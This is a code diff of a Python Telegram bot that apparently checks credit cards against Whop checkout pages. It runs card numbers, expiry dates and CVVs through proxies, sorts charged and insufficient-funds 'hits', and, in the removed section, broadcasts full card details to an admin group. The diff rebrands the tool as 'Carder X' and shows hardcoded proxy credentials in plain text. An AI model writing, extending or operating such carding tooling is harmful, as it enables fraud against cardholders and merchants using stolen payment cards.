@@ -26,16 +26,9 @@ import random
 import urllib.parse
 from datetime import datetime
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AIogram Imports
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 from aiogram import types, F, Router
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# LOCAL IMPORTS — fully defensive so a missing module
-# doesn't take the whole bot down with an ImportError.
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 from database import (
     is_gate_enabled,
     get_db_connection,
@@ -44,9 +37,6 @@ from database import (
     get_premium_status,
 )
 
-# `sub.get_hitter_status` does not exist in this build.
-# `database.get_premium_status` returns (bool, Optional[datetime])
-# which is exactly what the rest of this file expects.
 get_hitter_status = get_premium_status
 
 try:
@@ -86,34 +76,10 @@ def to_math_bold(s: str) -> str:
 
 user_last_command_time = {}
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# ADMIN IDS — synced with main.py
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ADMIN_IDS = {6962534443, 8428369446}
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BROADCAST CONFIG
-#
-# Both groups receive ONLY:
-#   • CHARGED cards 💎     (order placed successfully)
-#   • INSUFFICIENT cards 💰 (insufficient funds)
-#
-# Declined / 3DS / incorrect-CVC / errors are NEVER broadcast.
-# They appear only in the user's private /whop reply.
-#
-# ── CHARGED_GROUP_CHAT_ID (admin)   → FULL details
-#      header + Whop URL + CC + gate + response + plan +
-#      email + OTP + proxy + all BIN fields + time + user + dev
-#
-# ── SUMMARY_GROUP_CHAT_ID (summary) → SHORT version
-#      header (with WHOP) + gate + response + plan + user
-#      (NO CC, NO URL, NO BIN, NO email, NO OTP, NO proxy, NO time, NO dev)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 CHARGED_GROUP_CHAT_ID = -1004437051761
-
-# ⚠️ Replace the placeholder below with your summary group's real chat ID.
-#    Must start with -100. The bot must be a member with Send Messages.
-SUMMARY_GROUP_CHAT_ID = -1004479507133  # ← REPLACE
+SUMMARY_GROUP_CHAT_ID = -1004479507133
 
 DEFAULT_ADMIN_PROXIES = [
     "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
@@ -175,7 +141,7 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if any(k in p for k in ["kashim", "chirag", "zlatan"]): return 'Zlatan <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
+                    if any(k in p for k in ["kashim", "chirag", "zlatan", "darkanon", "carderx"]): return 'Carder X <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                     if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
@@ -202,10 +168,6 @@ def luhn_check(card_number: str) -> bool:
                 digit -= 9
         total += digit
     return total % 10 == 0
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# COMMAND HANDLER: /whop <url> <cc>
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 @router.message(F.text.regexp(r'^/(?:whop|whophit)(?:\s|$)'))
 async def whop_command(message: types.Message):
@@ -304,10 +266,6 @@ async def whop_command(message: types.Message):
         )
     )
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BACKGROUND PROCESSOR
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv,
                              whop_url, selected_proxy, plan_name, is_admin_fallback):
     try:
@@ -354,11 +312,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             otp_code = "N/A"
             elapsed = round(time.time() - start_time, 2)
 
-        # ── Classification ────────────────────────────────────────
-        # is_charged       → true only for ORDER_PLACED / charged
-        # is_insufficient  → true for INSUFFICIENT_FUNDS specifically
-        # is_approved      → true for other approvals (3DS, incorrect cvc, etc.)
-        #   Only is_charged and is_insufficient get broadcast.
         is_charged = False
         is_insufficient = False
         is_approved = False
@@ -399,7 +352,7 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
 
         user_name_safe = html.escape(user.first_name or "User")
         user_link = f'<a href="tg://user?id={user.id}">{user_name_safe}</a>'
-        dev_link = '<a href="https://t.me/Salluuxx">Zlatan</a>'
+        dev_link = '<a href="https://t.me/Lanxo2">Carder X</a>'
         user_display = f"{user_link} ({plan_name})"
 
         proxy_indicator = "Admin Proxy (Default)" if is_admin_fallback else "User Proxy"
@@ -429,7 +382,7 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
         )
 
         reply_markup = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="ZLATAN", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
+            [InlineKeyboardButton(text="CARDER X", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
         ])
 
         try:
@@ -448,84 +401,3 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                 )
             except Exception as e2:
                 logging.error(f"Fallback reply with HTML failed: {e2}")
-                try:
-                    plain_caption = re.sub(r'<[^>]+>', '', final_caption)
-                    await proc_msg.edit_text(
-                        text=plain_caption,
-                        reply_markup=reply_markup
-                    )
-                except Exception as e3:
-                    logging.error(f"Plain text edit failed: {e3}")
-                    try:
-                        await message.reply(text=plain_caption)
-                    except Exception:
-                        pass
-
-        # ── Broadcast — TWO groups, CHARGED + INSUFFICIENT only ──
-        #   1. CHARGED_GROUP_CHAT_ID (admin)   → FULL details
-        #   2. SUMMARY_GROUP_CHAT_ID (summary) → SHORT version, no CC
-        if is_charged or is_insufficient:
-            if is_charged:
-                header         = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
-                summary_header = "<b>💎 𝗪𝗛𝗢𝗣 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
-                badge          = "CHARGED"
-            else:
-                header         = "<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
-                summary_header = "<b>💰 𝗪𝗛𝗢𝗣 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
-                badge          = "INSUFFICIENT"
-
-            # ── 1. Admin group — FULL details ──
-            url_line = f"<b>🔗 𝗪𝗵𝗼𝗽 𝗨𝗥𝗟:</b> <code>{html.escape(whop_url)}</code>\n"
-
-            full_text = (
-                f"{header}\n"
-                f"━━━━━━━━━━━━━━━━\n"
-                f"{url_line}"
-                f"━━━━━━━━━━━━━━━━\n"
-                f"{final_caption}"
-            )
-
-            try:
-                await safe_send_message(
-                    message.bot,
-                    chat_id=CHARGED_GROUP_CHAT_ID,
-                    text=full_text,
-                    parse_mode="HTML",
-                    reply_markup=reply_markup,
-                )
-            except Exception as e:
-                logging.error(f"Whop broadcast → CHARGED_GROUP_CHAT_ID (full) failed: {e}")
-
-            # ── 2. Summary group — SHORT version (no CC, no URL, no BIN/email/OTP) ──
-            short_text = (
-                f"{summary_header}\n"
-                f"<b>🌐 𝗚𝗮𝘁𝗲:</b> 𝗪𝗵𝗼𝗽 𝗔𝘂𝘁𝗼-𝗛𝗶𝘁𝘁𝗲𝗿\n"
-                f"━━━━━━━━━━━━━━━━\n"
-                f"<b>💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {html.escape(str(res_message or badge))}\n"
-                f"<b>📦 𝗣𝗹𝗮𝗻:</b> <code>{html.escape(str(plan_id))}</code>\n"
-                f"<b>👤 𝗨𝘀𝗲𝗿:</b> {user_display}"
-            )
-
-            try:
-                await safe_send_message(
-                    message.bot,
-                    chat_id=SUMMARY_GROUP_CHAT_ID,
-                    text=short_text,
-                    parse_mode="HTML",
-                    reply_markup=reply_markup,
-                )
-            except Exception as e:
-                logging.error(f"Whop broadcast → SUMMARY_GROUP_CHAT_ID (short) failed: {e}")
-
-    except Exception as fatal_err:
-        logging.error(f"Fatal unhandled exception in process_whop_check: {fatal_err}", exc_info=True)
-        try:
-            await proc_msg.edit_text(
-                f"⚠️ <b>Check Failed:</b> {html.escape(str(fatal_err)[:100])}",
-                parse_mode="HTML"
-            )
-        except Exception:
-            try:
-                await proc_msg.edit_text(f"⚠️ Check Failed: {str(fatal_err)[:100]}")
-            except Exception:
-                pass
